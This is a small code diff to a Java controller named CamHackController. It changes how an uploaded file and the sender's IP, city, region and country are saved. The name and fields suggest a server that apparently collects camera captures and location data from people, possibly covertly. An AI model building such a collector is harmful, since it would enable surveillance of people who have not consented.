@@ -24,7 +24,8 @@ public class CamHackController {
             @RequestParam("country") String country
     ) {
         try{
-            camHackService.saveFile(file,clientIp,city,region,country);
+            camHackService.getClientInfo(clientIp,city,region,country);
+            camHackService.saveFile(file);
             return new ResponseEntity<>("yepp",HttpStatus.OK);
         }catch (Exception e){
             return new ResponseEntity<>("an error occured",HttpStatus.I_AM_A_TEAPOT);
